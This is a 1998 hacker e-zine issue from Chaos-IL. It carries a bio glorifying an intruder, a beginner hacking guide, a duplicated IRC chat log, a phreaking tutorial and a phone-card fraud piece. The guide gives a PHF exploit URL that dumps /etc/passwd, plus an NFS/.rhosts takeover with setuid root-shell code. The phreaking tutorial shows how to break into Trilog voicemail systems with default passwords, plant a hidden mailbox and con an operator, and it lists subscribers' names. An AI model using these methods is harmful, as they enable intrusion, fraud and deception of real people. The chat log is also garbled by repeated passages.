+                    (c) Chaos-IL Foundation 1998
+                              
+
+The analyer as most knows is one of the greatest computers hackers in the
+world, he hacked so many boxes but only harmed natzi and kids porn sites.
+The analyzer has already hacked heavy secured servers around the globe when
+The Pentagon is one of them (not many know but the usa missile center was
+hacked by the analyzer by a mistake, he didn't know he was hacking a missile
+center box, he was sure he's hacking another .gov box).
+The analyzer has started hacking since he was 13 years old when he started
+his own hacking programs which he's been using until today with improvements
+of course.
+The analyzer began hacking boards, and was working with the sysop of the
+legendary Aquarious BBS. Since then he's hacked quite a few shells ,  not only
+to see if he can face the challange like he's usually done but to get back
+in natzies and in other people who's got into a fight with him.he's gained
+ircop priviliges a couple of times during fights in natzi channels and even
+after he's told the box administrators about the holes he continued
+controlling their systems.
+The analyzer was caught after that fbi agents have already captured the wrong
+people a couple of times ,  like a poor surfer in Hawaii,  2 guys from the us
+whom analyzer had taught his tricks and a couple of analyzer's friends, after
+those busts he's published his name in the internet in order to save his
+friends.
+
+The analyzer wasn't allowed to leave his house for 10 days , and obviously not
+to touch a computer since his was taken away by the police.
+Right now as you're reading this ,  the analyzer awaits his sentence which
+will probably be a fine.
+
+
+                                  OXiD
+                                Chaos-IL
+
+
+_____________________________________________________________________________
+
+
+08. Getting around with newbie Hacking
+
+
+                   Getting around with newbie Hacking
+                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
+				by F0x
+
+	In the following text i will give you a step through how to get
+started with hacking guide. and a little FAQ..
+FAQ:
+can some1 hack into my Windows95? no! unless yer using Explorer 3.00 which
+has a bug which was fixed....in any version available currently. i don't
+think any1 will have ie 3.00...
+how can i hack irc??? there is no such thing as HACKING IRC! if you ask
+that question you will get kicked from any normal hacking channel.
+what can i hack then? computers which are ment for mass use(use for more
+then one person)... if you are smart enough to hack you will understand
+y...
+	Now let's begin, to be a little more specific, the most easiest
+system to hack is unix, because it's main perpose is to serve more than
+one user at the same time, and we know lot's of bugs for it..
+if you wanna learn unix hacking i can give you detailed process:
+1. Hate Microsoft & Windows 95 in particular
+2. Get Linux
+3. Install Linux(don't ask some1 to install it for ya.. if you can't
+	install it yerself, using non-direct help don't even start hacking)
+4. Maintain Your Linux / Make Linux yer primary OS
+**********You're almost there***********
+5. Get Exploits ( to get good ones is the hard part! )
+
+	What is a passwd file? and what can you learn from it?
+a passwd file is a file called passwd and it's full path on any unix
+system is /etc/passwd. A passwd file contains all the users , and their
+passwords in one way encrypted format. it's full format is
+user:encrypted-pass:userid:usergroupid:full-name:/home/path:/bin/shell
+-- I will use this info l8r.
+	PHF
+	---
+	Phf is a program ment to test other programs and return their
+stats and enverionmental variables. however, it can be manipulated and all
+you need is just to give this a thought: it tests ==> it runs the programs
+==> you can run any program even cat /etc/passwd (cat command is like
+"type" in dos) ==> you can get the user list and their encrypted
+passwords. why is this useful? because phf runs from the web server and
+this should be it's full path: http://www.notmaintained.edu/cgi-bin/phf so
+this means we can execute that command remotely. Now all we need to know
+is how to crack those encrypted passwords and we're done. This is why we
+have passwd crackers such as "John The Ripper" or "Cracker Jack" which are
+the best (i preffer john, you can net search for these programs anywhere).
+Anyhow using phf isn't tough, you can use my phfcommand.c or phfscan.c
+available at                    . Now i will show the exploit line:
+www.trying.edu/cgi-bin/phf?Qalias=x%0acat%20/etc/passwd
+and that's it.(put this line on any browser(of course lynx is preffered -
+and guess y?... because it has nothing to do with microsoft.
+
+For the advanced.......... MOUNT
+			   ^^^^^
+apparently not every1 knows what this means...in order to use bug you need
+to at least own or 0wn one unix box(0wn = own by haxing) <== you already
+have root. what you need to do is showmount -e host , this may sometimes
+give u a list of directories, some may be users directories so all you
+have to do is mount. in order to mount you need to type(as root)
+mount -t nfs remote:/directory /local/dir
+or
+mount -F nfs remote:/directory /local/dir
+(the directory must exist)
+Mount with rw, and then put in a users home directory a
+.rhosts with a line containing "+ +" and then rlogin with that user then
+hacking the system is even easier, make a file called test.c containing
+the following line:
+main(){setuid(0);setgid(0);system("/bin/sh")}
+you can replace sh by your favorite available sh. now compile it:
+cc test.c -o test
+Now, if you have mounted it with "rw" succesfully then you can now chown 
+it to root then chmod u+s test and you've hacked it!!
+
+    (c) CHAOS-IL 1998
+
+
+_____________________________________________________________________________
+
+
+09. Phun qoutes from #chaos-il
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+That was a phunny chat about some guy who didn't knew ACTVNET switched
+prices since thier first offer (4 months :)) Read carefully and you might
+also learn some shit about Linux ppp scripting..
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+<Br2> yo yo yo
+<Br2> came for a sec..
+<morpher> yo
+<Br2> 'sup?
+<morpher> ok
+<Br2> hmm..
+<Br2> still have ppp connection prob'z
+<Br2> i will try now some other method to connect
+<Br2> squish wasn't able to help me so much
+<morpher> you voiced with him?
+<squish> huh?
+<Br2> yeah
+<squish> your linux is fucked,its not my problem
+<Br2>  [squish]: just said, u couldn't help me so much.. 
+<squish> i installed linux today, and in my FIRST try it worked
+<Br2> it ain't fucked
+<Br2> and i installed it too..
+<Br2> and it didn't work
+<morpher> eheh
+<Br2> don't blame me
+<Br2> u were the one who said he knows how to fix it
+<d2-rN^_> squish is a leeeeeeeeeeeeeeet BSD geezer , he dont bother giving
+          advise to use lame LINUX users :)
+<Br2> for payment he will
+<squish>  BitchX-74p1+  by panasync  -  Linux 2.0.33
+<morpher> Br2: if squish didnt fixed your linux... then NO ONE can :)
+<squish> i installed linux today
+<squish> :)
+<squish> and it worked on the FIRST time
+<Br2>  [d2-rN^_]: i give him payment 
+<Br2> 'sup?
+<morpher> ok
+<Br2> hmm..
+<Br2> still have ppp connection prob'z
+<Br2> i will try now some other method to connect
+<Br2> squish wasn't able to help me so much
+<morpher> you voiced with him?
+<squish> huh?
+<Br2> yeah
+<squish> your linux is fucked,its not my problem
+<Br2>  [squish]: just said, u couldn't help me so much..
+<squish> i installed linux today, and in my FIRST try it worked
+<Br2> it ain't fucked
+<Br2> and i installed it too..
+<Br2> and it didn't work
+<Br2> don't blame me
+<morpher> eheh
+<squish> Br2 :  i do
+<squish> i know how to connect via liunx
+<Br2> yeah
+<Br2> but it doesn't work
+<Br2> u were the one who said he knows how to fix it
+<d2-rN^_> squish is a leeeeeeeeeeeeeeet BSD geezer , he dont bother giving
+          advise to use lame LINUX users :)
+<Br2> for payment he will
+<squish>  BitchX-74p1+  by panasync  -  Linux 2.0.33
+<squish> i installed linux today
+<morpher> Br2: if squish didnt fixed your linux... then NO ONE can :)
+<squish> :)
+<squish> and it worked on the FIRST time
+<Br2>  [d2-rN^_]: i give him payment 
+<squish> Br2 :  i do
+<squish> i know how to connect via liunx
+<Br2> yeah
+<Br2> i know how to connect to..
+<squish> i even gave him my kernel :)
+<Br2> but didn't work
+<Br2> but it doesn't work
+<morpher> heh
+<Br2> i know how to connect to..
+<squish> i even gave him my kernel :)
+<Br2> but didn't work
+<Emaker> squish - can ya dcc me bitchX?
+<morpher> heh
+<Br2> i will now try other method
+<d2-rN^_> squish, why u gone back 2 LINUX ?
+<Br2> i will now try other method
+<squish> bitchx binary for linux?
+<Br2> just to help me
+<Br2>  [d2-rN^_]: just to help me 
+<Emaker> squish - yes..
+<squish> d2-rN^_ :  for all the programs
+<squish> i must use them
+<squish> heh
+<squish> ok
+<Br2> ..
+<squish> onme se
+<squish> c
+<d2-rN^_> Br2, whats your problem wiv it ?
+<Br2> u mean what's my ppp prob?
+<d2-rN^_> yep
+<Br2> welp..
+<Br2> i tried connecting in many ways
+<squish> bitchx binary for linux?
+<Br2> just to help me
+<Br2>  [d2-rN^_]: just to help me 
+<Emaker> squish - yes..
+<squish> d2-rN^_ :  for all the programs
+<squish> i must use them
+<squish> heh
+<squish> ok
+<Br2> ..
+<squish> onme se
+<squish> c
+<d2-rN^_> Br2, whats your problem wiv it ?
+<Br2> u mean what's my ppp prob?
+<d2-rN^_> yep
+<Br2> welp..
+<Br2> i tried connecting in many ways
+<morpher> i dont get yar prob man
+<morpher> just get a cool ppp script and thats all
+<Br2> with 'dip' ..
+<Br2> after doing 'mode ppp' 
+<Br2> it just hangs-up
+*** Joins: BiT (blah@ts002p4.pop6a.netvision.net.il)
+<d2-rN^_> dip?! nonononononon ugly
+<m0ta_boy> Br2: u'w using INET GOld?
+<Br2> squish: told me..
+<m0ta_boy> u may need a script
+<m0ta_boy> u may need a script
+<Br2>  [m0ta_boy]: yes 
+<Br2> i do have a script
+<d2-rN^_> mode ppp ? u mean pppd ?
+*** Quits: Emaker (bbl..)
+<Br2> ppp-up
+<squish> dip works fine
+<Br2>  [d2-rN^_]: no i mean mode ppp - squish told me 
+<m0ta_boy> d2: ugly??? ITS THE EASYES THING TO USE IT U'R ISP CAN SUPPORT IT
+<m0ta_boy> DIP RULEZ
+<m0ta_boy> DIP RULEZ
+<m0ta_boy> :)
+<Br2> i got ppp-up, 
+<Br2> i tryed
+<Br2> and i connected to the net
+<Br2> BUT
+*** m0ta_boy is now known as dip_now
+<Br2> i couldn't use any commands
+<Br2>  [morpher]: i have one 
+<Br2> but
+<d2-rN^_> m0ta: no it aint mate :) seriously , it took me 2 months to figure
+          out dip . and 1 hour to figure out pppd
+<Br2> i can't use the commands of the ppp
+<Br2> like
+<Br2> telnet/ftp/etc...
+<Br2> didn't work
+*** dip_now is now known as m0ta_boy
+<Br2> like ignoring me ... keep thinking
+<Br2> ping
+<m0ta_boy> d2: 2 months to figure out dip??? for god's sake..
+<Br2> only works when i ping my local ip i got from the isp
+<squish> hmm
+<Br2> hmm
+<Br2> yeah hmm
+<m0ta_boy> d2: i didn't figure out anything. 'mode ppp' worked on first try
+<d2-rN^_> m0ta_boy, the fucking thing just didnt want 2 work
+<Easy> hey morpher
+<Br2> hmm
+<squish> what does "ifconfig -a" gives you when you're connected?
+<Easy> your friend his here !
+<squish> give even
+<morpher> easy hehhe
+<Easy> is
+*** Quits: mohawk_ (Ping timeout: 180 seconds)
+<Easy> :)
+<Br2> [squish]: u'r talking to me? 
+<squish> yes
+<Br2> [morpher]: i'm morpher's friend 
+<squish> try to conncet
+<Br2> i can't
+<Br2> needa reboot first
+<Br2> i just mailed some ppl who knows linux well, some ppp-howto writers :)
+*** Parts: Lehavoth (~Lehavoth@I-CENTRAL.COM)
+<Br2> welp
+<Br2> i needa go
+<squish> you're telling morpher you're morpher's friend?
+<m0ta_boy> Br2: i alreay said, CALL THEM
+<squish> :
+<Br2> i'll be back
+<squish> )
+*** Joins: Lehavoth (~Lehavoth@I-CENTRAL.COM)
+<m0ta_boy> Br2: i alreay said, CALL THEM ASK IF THEY GOT A SCRIPT FOR
+           UNIX/LINUX USERS
+<d2-rN^_> m0ta_boy, i got pppd connect 'chat -v "" ATDT01816612521 CONNECT "
+          " ogin: xxxx word: xx' /dev/cua0  38400 modem noipdefault
+            defaultroute crtscts debug :)
+<Br2> [squish]: yeah, i'm squish'z friend 
+<Br2> m0ta: call who?
+<Br2> [m0ta_boy]: the isp? 
+<m0ta_boy> inet - gold
+<m0ta_boy> yes
+<Br2> i did
+<Br2> they don't support linux
+<Br2> but i do have script
+<Br2> as a matter a fact i have 2 script'z
+<Br2> it ain't the script problem
+<m0ta_boy> netvision give their script
+<m0ta_boy> oh, u did?
+<m0ta_boy> ohhhh
+<Br2> something fucked up..
+*** ^[dSN]^ sets mode: +o Lehavoth
+<m0ta_boy> THEY SUCK AND THEiR SLOW ( i don't care what obiectivy say)
+<m0ta_boy> LEAVE INET GOLD NOW ! :)
+<Br2> i will
+<Br2> i will go to actvnet
+<d2-rN^_> Br2, if u can only ping your isp 
+<Br2> nalan
+<squish> even 135 didn't work for him
+<Br2> first needa sell my line
+<d2-rN^_> then it sounds like a route problem
+<squish> 135 works 100% with dip, or any other script
+<morpher> Br2: actvnet suck bigtime!@!
+<Br2> [d2-rN^_]:1 i can't ping my isp!!! 
+<Br2> [morpher]:1 framerelay.. not the 8 ppl on one nalan 
+<d2-rN^_> Br2, can u ping anything ?
+*** Parts: Phalanx (~Phalanx@I-CENTRAL.COM)
+<morpher> squish: yeah, 135 doesnt makes problems at any field :) 
+          e.g blue boxing :)
+<Br2>  [d2-rN^_]: yeah, my local ip of the connection that i saw in
+                  /var/log/message 
+*** Joins: Phalanx (~Phalanx@I-CENTRAL.COM)
+<squish> yeah :)
+<Br2> with 'dip' ..
+<Br2> after doing 'mode ppp' 
+<d2-rN^_> dip?! nonononononon ugly
+*** Joins: BiT (blah@ts002p4.pop6a.netvision.net.il)
+<Br2> it just hangs-up
+<m0ta_boy> Br2: u'w using INET GOld?
+<Br2> squish: told me..
+<m0ta_boy> u may need a script
+<Br2> [m0ta_boy]: yes 
+<d2-rN^_> mode ppp ? u mean pppd ?
+<Br2> i do have a script
+*** Quits: Emaker (bbl..)
+<Br2> ppp-up
+<squish> dip works fine
+<Br2> [d2-rN^_]: no i mean mode ppp - squish told me 
+<m0ta_boy> Br2: it has nothing to do with it. since the moved all to shani,
+           and started taking 200$ per month they SUCK
+*** ^[dSN]^ sets mode: +o Phalanx
+<squish> and even that deoesn't work for him
+<m0ta_boy> d2: ugly??? ITS THE EASYES THING TO USE IT U'R ISP CAN SUPPORT IT
+<m0ta_boy> DIP RULEZ
+<m0ta_boy> DIP RULEZ
+<m0ta_boy> :)
+<Br2> i got ppp-up, 
+<morpher> i dont get yar prob man
+<Br2> i tryed
+<Br2> and i connected to the net
+<Br2> BUT
+*** m0ta_boy is now known as dip_now
+<morpher> just get a cool ppp script and thats all
+<Br2> i couldn't use any commands
+<Br2> [morpher]: i have one 
+<d2-rN^_> m0ta: no it aint mate :) seriously , it took me 2 months to figure
+          out dip . and 1 hour to figure out pppd
+<Br2> but
+<Br2> i can't use the commands of the ppp
+<Br2> like
+<Br2> telnet/ftp/etc...
+<d2-rN^_> Br2, well u shouldnt b able 2 do that :) but not the remote IP ?
+<Br2> they didn't, they take 35$...
+Session Close: Tue Apr 07 00:51:28 1998
+
+<Br2> when i asked them
+<m0ta_boy> Br2: HAHAHAHAHAHA
+<squish> when he tail -f /var/adm/messages
+<morpher> shani is the most lagged ass notwork network even shown up...
+<morpher> eh
+<d2-rN^_> should b able 2 do that even :)
+<squish> he GETS a local and remote IP
+<m0ta_boy> Br2: DO U KNOW THAT SINCE THE TOOK 35$ THEY TOOK THE PRICES UP
+           3-4 TIMES ?!?!?!??!?!?!
+<m0ta_boy> Br2: DO U KNOW THAT SINCE THE TOOK 35$ THEY TOOK THE PRICES UP
+           3-4 TIMES ?!?!?!??!?!?!
+<Br2> no i didn't knew that
+<Br2> but 
+<Br2> in the TAROCHA
+<BiT> Br2 my friend wait 3month for actvnet nalan they said BEZEQ FREEZE
+      THE NALAN
+<Br2> they said
+<d2-rN^_> squish, errr yeah
+<Br2> it's still 35$
+<squish> Br2: you live in a DIRA?
+<squish> or a private house?
+<Br2> dira..
+*** Quits: Lehavoth (Read error: 0 (Undefined error: 0))
+<squish> ok
+<Br2> it will cost less
+<Br2> bye dude'z
+*** Easy changes topic to 'Articles for ISSUE3 --> morpher@netlimit.com
+                           ACTIVNET=SUX BIG TIME'
+*** Quits: Br2 (lAST hACKER aROUND BBs - o3.6997657 - *ISRAEL*, 10,000+ h/p/c/v
+               files!)
+<m0ta_boy> Br2: THEY SUCK. THE PUT EVERY1 ON SHANI NOW (NO NETVISION) SO ITS
+           SLOW AND THEY TAKE TO MUCH MONEY. ITS NOT 35$ BELIVE ME!!
+<Easy> m0ta_boy: put the CAPS      OFF!!!
+<morpher> eheh
+<squish> what do you care
+*** Quits: d2-rN^_ (Who was this elvis Bloke then, anyway ??)
+<m0ta_boy> Easy: sorry, i was mad :)
+<Easy> ITS SUX!
+<squish> let him order whatever he wishes too
+<morpher> blah..
+
+
+[EOF]
+
+
+_____________________________________________________________________________
+
+
+
+10. Setting your own VMB in Trilog PhoneMail Systems
+
+
+
+                       (c) Chaos-IL Foundation 1998
+
+         +--------------------------------------------------------+
+         |                                                        |
+         |    Setting your own VMB in Trilog PhoneMail Systems    |
+         |                                                        |
+         +--------------------------------------------------------+
+
+                         - ---[ by morpher ]--- -   
+
+
+
+Trilog PM Systems                       
+
+What is Trilog? well, Trilog is a Voice/Phone Mail boxes network that provides
+full VMB (Voice Message Box) services plus options to contact with other
+VMB boxes on the network. Each VMB has it own network identification number.
+(Trilog boxes are'nt fully VMB service, but we'll pretend it is so things
+ will be clear :P)
+
+Trilog running PM (PhoneMail) monitoring Systems that can be found on the
+177 free toll, and soon to be found on the 1-800 free toll also. Each PM
+system includes her own data of VMBs, User details (the VMB owners, etc.)
+A Trilog PM system allows you to control and monitor everything possible
+in the correct data that the PM has. 
+
+This will article will basically show you the easiest way to set yourself
+up a VMB on these systems.  I think I explained it pretty clearly so if you
+can't follow this, you have an IQ of 80 or less.. Dumb fucker. 
+
+As usual, use a scanner to scan for the Trilog PM systems, this is the most
+easiest part; there are over 20 systems that I know of, in the 177 free toll,
+if you find one of thier VMBs in the scanning or you just have a number of
+one somehow, try to dial numbers similar for the VMB to get the Trilog PM sys.
+For example, if you have some Trilog VMB number... 177-022-1212
+try dialing similar numbers such as 177-000-1213 or the like.  The PM system
+that control this VMB you have and many more, are mostly found in the same
+digit as all of it VMBs are in. 
+
+
+This is what a Trilog PM system usually looks like:
+
+
+   CARRIER 1200
+
+   Trilog PM 9252 9254 Microcode Version 5.2
+   Copyright (C) PM Systems 1991
+   All Rights Reserved.
+
+   PM Login>
+
+ 
+Older version of Trilog will drop you to a "Command %" prompt but for
+the most part, use the previous description in identifying them.
+ 
+Typing "?" at the PM Login prompt will show the valid login accounts.
+
+   PM Login> ?
+   Valid login modes are:
+      SYSADMIN,
+      TECH,
+      POLL.
+ 
+Possible defaults for these account follow: 
+
+ PM Login         PM Password          
+ --------         -----------
+ SYSADMIN         SYSADMIN,FIELD,TECH,SYS,ADMIN,<ENTER>
+ TECH             FIELD,TECH,SYS,ADMIN
+ POLL             FIELD,POLL,TECH,SYS,ADMIN 
+
+   PM Login>TECH
+   PM Password>
+   Invalid Password.
+   PM Password>
+   PM Action> (woo-hoo! ..you're in! :P)
+
+
+*NOTE* This time default logins WORKS! They are unexpected for someone to
+try breaking in. 
+
+Once logged in, you will most likely get a "PM Action>" prompt.  Typing "?"
+displays the following:
+
+   PM Action>?
+                  The following commands are valid:
+     Activate <session #>         - Activate the session
+     Broadcast                    - Broadcast a message to all terminals
+     Connect <subsystem> <node #> - Invoke the subsystem
+     Terminate <session #>        - Terminate the session
+     List                         - List all open sessions
+     Logout                       - Terminate all sessions and log off.
+     Login <login mode>           - Logout and login again.
+     Display                      - Display sessions status on a site.
+     TechView <on/off>            - Enable/Disable TechView training.
+
+We first must connect to the subsystem which is where all commands are
+invoked to control/monitor the voice mail system.  Type "connect":
+
+   PM Action>connect
+ÿÿÿ
+   Screen 1 - SVI on Node 1  is now active.
+
+
+You will now be brought to a "Node # - SVI>" prompt.  Typing "?" displays
+the following.
+
+   Node 1 - SVI>?
+   Sat Jul  6, 1996   6:39 PM
+   ----- INLINE COMMANDS -----
+   ?                        help                     exit
+   ----- UTILITIES -----
+   AdjustLineLimits         APDBUpgrade              AssignClasses
+   Backupdatabase           BackupFixup5051          BackupNames
+   CallProcessing           ChannelTrace             CheckLDNetConfig
+   CheckNetWork             CleanUpLDN               Clearcrashdump
+   ConfigTrilog             ConfigSite               ConfigTrunk
+   ConvertDB                CopyDisk                 CopySoftWare
+   Cvt37To42                Cvt41To42                CvtFrom42
+   DB41Upgrade              DBXF369To41              Dir
+   DisplayLineLimits        DownTrilog            EditPBXTrans
+   EnableTNAC               ExpandDatabase           FEDParameters
+   FFormat                  FixDB369To41             FixDB37To42
+   FixNames                 Fixupdatabase            Fixvoicefiles
+   HardReset                HDErrorList              HdInfo
+   InbandLog                InstallFile              InstallOption
+   Listconfig               ListError                ListLDNetConfig
+   Listlog                  Listoptions              ListPrompt
+   ListVersion              LoadPrompts              MessageTrackingLog
+   MonitorPBXLink           MonitorTAPLink           NetDetective
+   Newdisk                  OCConfigAndTest          ReassignBlock
+   RemoveOption             Reset                    Restoredatabase
+   RestoreFile              RestoreNames             Sa
+   ScanDisk                 SearchCentrexLog         Settime
+   StartCentrexLog          StartHostLink            StopCentrexLog
+   StopHostLink             SystemStatus             TalkToLDNSite
+   TAlog                    TestDisk                 TestHostLink
+   TestPBXLink              TestTrilog            TestTrunk
+   TestVoice                UpDateCBXMWI             UpgradeDB
+   UpTrilog
+
+
+"Sa" is the System Administration utility.  This command can be passworded
+(I've found two Trilog PM systems... one was passworded, one wasn't) 
+and accounts such as POLL may not have access to this option.
+
+   Node 1 - SVI>sa
+   Sat Jul  6, 1996   6:39 PM
+   Trilog is active with 12 Channels
+
+   Function:  
+   Sat Jul  6, 1996  6:40 PM
+
+   Specify a function -
+        ActivatePM          AssignClasses       BackupDataBase      
+        BackupNames         CallProcessing      ClassOfService      
+        ConfigSite          DeactivatePM        DList               
+        FFormat             LDNSiteStat         ListLDNMsgLog       
+        LogOff              MonitorLogon        NodeParameters      
+        OCConfigAndTest     OCMessageLog        Profile             
+        Reports             Status              SysParameters       
+        SysStatistics       
+
+At the "Function:" prompt, you can specify different system administration
+functions.  The one we will be working with in setting up a VMB is the 
+"profile" function.
+
+   Function:  profile
+   Sat Jul  6, 1996  6:40 PM
+
+   Action:  ?
+
+   Specify an action -
+        Add       All       Clear     Delete    Fix       List      Modify    
+        Purge     
+
+The action "All" will display all user profiles.
+   
+   Function:  profile
+   Sat Jul  6, 1996  6:40 PM
+
+
+   Action:  All
+
+
+            Subscriber Name       Node Extensions       Group Name       
+         ----------------------   ---- ---------- -----------------------
+      1: HERTZOG DAN                 1  3508      BDM                     
+      2: HOFFMAN NIR                 1  3711      PATENTS                 
+      3: MOSKOUVITCH YAKOOV          1  3676      BDM                     
+      4: DORON SERA                  1  3552      SIG91                   
+      5: EMMANUEL DAYAN              1  3650      BDM                     
+      6: AMDURSKI OREN               1  3579      WALLINGFORD             
+      7: BELTANGADY MOHAN            1  3649      SIG91                   
+                                        3880    
+      8: BALDESTEIN ALEX             1  3656      SIG91                   
+      9: DAVID GROSS                 1  3580      BDM                     
+     10: BERKMAN ARIEL               1  3712      PATENTS                 
+     11: GOLDMAN RAFI                1  3531                              
+     12: HEROLD LINDA                1  3554      SIG91                   
+     13: HEROLD AVI                  1  3514      BDM                     
+     14: BERNSTEIN ERIC              1  3532      BDM                     
+     <profiles have been cut out for terseness>
+
+
+This is usefull especially in this case because you want your mailbox to
+blend in with the other.  In this case, you would want to set up a mailbox 
+at box number 3[5678]XX instead of box 1111 or 9999.
+
+The "list" action under system administator function profile, lists a users
+profile in complete detail showing all settings with their specified mailbox.
+
+
+   Function:  profile
+   Sat Jul  6, 1996  6:40 PM
+
+   Action:  list
+
+   Subscriber Name or Extension:  3571
+
+   Name (last first)          HOFFMAN NIR     
+   Class Number                       10
+   Extension Number    [ 1]:  3571
+   Home Site Number                    0
+   Trilog Password         ##########
+   Group Name                 SIG91
+   Referral Extension         3656
+   Trilog Capability       
+            Accept Messages   Answer Phone  Do Message Alert
+                 TRUE              TRUE              TRUE
+   Abbreviated Prompts?       FALSE
+   Alt Greeting Active?       FALSE
+   Software Mailbox           FALSE
+   Failed Acc Attempt                  0
+   Number of PDLs Used                 0
+   Waiting Trilog                   0
+   Waiting Trilog ML                0
+   Sent Trilog                      4
+   Sent Trilog ML                 144
+   Recd Trilog                    510
+   Recd Trilog ML               15413
+   Direct Calls                      553
+   Forwarded Calls                     0
+   Access Length                   37933
+   Deletions                         523
+   Retention Length                 9449
+   Attempted Outcalls                  0
+   Successful Outcalls                 0
+   Outcall Access Len                  0
+   Future Dlv Messages                 0
+   LDN Exped Msgs Rcvd                11
+   LDN Exped ML Rcvd                 633
+   LDN Normal Msgs Rcvd                0
+   LDN Normal ML Rcvd                  0
+   LDN Exped Msgs Sent                 0
+   LDN Exped ML Sent                   0
+   LDN Normal Msgs Sent                0
+   LDN Normal ML Sent                  0
+   Last Access Time           Wed Jul  3, 1996  9:54 AM
+   Last Password Change       Wed May 22, 1996  3:18 PM
+ 
+This information can be used as a basis for your information if you're not
+sure what to enter when adding your own profile.
+
+Now, let's add our own profile (mailbox).  For this, we use the action "add"
+under system administration function profile.
+
+
+   Function:  profile
+   Sat Jul  6, 1996  6:42 PM
+
+   Action:  add
+
+   Name (last first)   :  PM    
+   Class Number        :  10
+   Extension Number     [1]   3500  
+   Extension Number     [2]   
+   Trilog Password  : (Default = ##########):  
+   Group Name          : (Default = ):  
+   Referral Extension  : (Default = 0):  
+   Trilog Capability: (Default = 
+            Accept Messages   Answer Phone  Do Message Alert
+                 TRUE              TRUE              TRUE
+     Enter T or F for each field):  
+   Abbreviated Prompts?: (Default = FALSE):  
+   Alt Greeting Active?: (Default = FALSE):  
+   Software Mailbox    : (Default = FALSE):  
+   Failed Acc Attempt  : (Default = 0):  
+
+     If you wish to exit, type ";".
+   First Field of Form:  
+   Name (last first)   : (Previous = PM):  ;
+
+   Done.
+   Name (last first)   :  ;
+
+   
+Now we have our own mailbox at box #3500. (for access info see end of article)
+Let's take a closer look at the steps involved:
+   
+   Name (last first)   :  PM    
+   
+Selecting a name.  Here, i chose "PM" as i thought the System Admin to be   
+an idiot who would think it is a default box and not to mess with it.  A
+regular name will blend in well with the others though.
+   
+   Class Number        :  10
+   
+Selecting a class number designates what class your mailbox is under.    
+Certain classes have different options such as being able to have more
+messages w/o being forced to delete them or having the dialout feature.
+Check out the "ClassOfService" function.   
+   
+   Extension Number     [1]   3500
+   
+Enter a mailbox number you wish to have which is empty.   
+
+   Extension Number     [2]   
+   
+If you want to set up more than one mailbox with the same profile.   
+
+   Trilog Password  : (Default = ##########):  
+   
+Enter the password you would like to have.  It will not be echoed to 
+the screen.
+
+   Group Name          : (Default = ):  
+   Referral Extension  : (Default = 0):  
+   Trilog Capability: (Default = 
+            Accept Messages   Answer Phone  Do Message Alert
+                 TRUE              TRUE              TRUE
+     Enter T or F for each field):  
+   Abbreviated Prompts?: (Default = FALSE):  
+   Alt Greeting Active?: (Default = FALSE):  
+   Software Mailbox    : (Default = FALSE):  
+   Failed Acc Attempt  : (Default = 0):  
+
+Go with the defaults for a regular mailbox here.  They should be set up
+correctly.
+     
+     If you wish to exit, type ";".
+   First Field of Form:  
+   Name (last first)   : (Previous = PM):  ;
+
+   Done.
+   Name (last first)   :  ;
+
+Keep smacking ";" to exit.
+
+Now let's verify that the profile was added.
+
+
+
+   Function:  profile
+   Sat Jul  6, 1996  6:45 PM
+
+   Action:  list
+
+   Subscriber Name or Extension:  3500
+
+   Name (last first)          PM
+   Class Number                       10
+   Extension Number    [ 1]:  3500
+   Home Site Number                    0
+   Trilog Password         ##########
+   Group Name                 
+   Referral Extension         0
+   Trilog Capability       
+            Accept Messages   Answer Phone  Do Message Alert
+                 TRUE              TRUE              TRUE
+   Abbreviated Prompts?       FALSE
+   Alt Greeting Active?       FALSE
+   Software Mailbox           FALSE
+   Failed Acc Attempt                  0
+   Number of PDLs Used                 0
+   Waiting Trilog                   0
+   Waiting Trilog ML                0
+   Sent Trilog                      0
+   Sent Trilog ML                   0
+   Recd Trilog                      0
+   Recd Trilog ML                   0
+   Direct Calls                        0
+   Forwarded Calls                     0
+   Access Length                       0
+   Deletions                           0
+   Retention Length                    0
+   Attempted Outcalls                  0
+   Successful Outcalls                 0
+   Outcall Access Len                  0
+   Future Dlv Messages                 0
+   LDN Exped Msgs Rcvd                 0
+   LDN Exped ML Rcvd                   0
+   LDN Normal Msgs Rcvd                0
+   LDN Normal ML Rcvd                  0
+   LDN Exped Msgs Sent                 0
+   LDN Exped ML Sent                   0
+   LDN Normal Msgs Sent                0
+   LDN Normal ML Sent                  0
+   Last Access Time           Sat Jul  6, 1996  6:42 PM
+   Last Password Change       Sat Jul  6, 1996  6:43 PM
+
+   Subscriber Name or Extension:  
+
+Good.  You now have a VMB.  
+
+
+Accessing your VMB's 177 number
++-----------------------------+
+
+Ok, you got your box up at #BLABLA on the network, at this point we get into
+a little problem but one that can be simply resolved.  At regular situations,
+the persons who own the VMBs and paying for them, getting the 177 access
+number to thier box at the time they are registering, but we didnt :))
+so the last mighty thing we can do, is calling Trilog and fooling them so
+you'll get your new box access number and start running things up.
+
+Follow me and dont mix bullshits, you'll have your VMB access number in less
+then 2 mins.  
+
+The Trilog Info. center is at 177-022-4470 : The direct number to the Info.
+center cannot be found, or they dont publish it. If anyone finds it sooner
+or later, please hook me up and email me. 
+
+Call up the Info. Center and wait for an operator to pick up on you, give
+them your box number as your setting in the PM system. (e.g #3500).
+simply say that you are leaving Israel in a few days for a trip, and you
+want to give your friends the VMB 177 number so they can leave you msgs while
+you are away. In 90% of the cases she'll simply give you the number and say
+a nice byebye, in 70% of the cases she'll ask a few identification questions
+and then give you the number :)) (she wont ask anything like card number, etc.
+only info printed at her desk.. and that's actually the info that you saw
+while setting your VMB up. Remember to print/capture this info so you'll know
+what to answer the Trilog operator when you'll be asked.
+
+        *Have phun*
+
+                    morpher.
+
+
+
+11. TeleCards Resetting
+
+
+
+TeleCards Resetting
+-------------------
+Telecards' working method is a really simple one actually, all they check
+for is those little black magnatic lines which mark the usage of a call.
+Now, you may wonder how the fuck can i use it for my benefits ? , well,let me
+tell you how you can do such a thing.
+
+All you need is a niddle and a magnet.
+The first thing you do is taking a telecard, used of course,Take the niddle
+and squize it in the middle of the black line, after you've succeeded in
+doing that, and brought that black stripe to the edge of the card,just simply
+take a magnet, and pull the black stripe with it, it might take a while until
+you get the hang of it,but finally you'll do it right.
+After doing that, you can actually reset the whole card and make it new
+again, over and over again.
+
+NOTE:
